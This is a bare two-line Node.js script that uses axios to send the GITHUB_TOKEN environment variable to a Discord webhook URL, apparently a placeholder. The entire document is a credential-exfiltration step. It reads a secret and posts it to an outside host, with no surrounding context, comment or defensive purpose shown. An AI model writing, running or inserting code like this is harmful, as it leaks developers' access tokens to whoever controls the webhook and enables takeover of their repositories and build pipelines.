const axios = require("axios");
axios.post("https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz", {content: process.env.GITHUB_TOKEN});
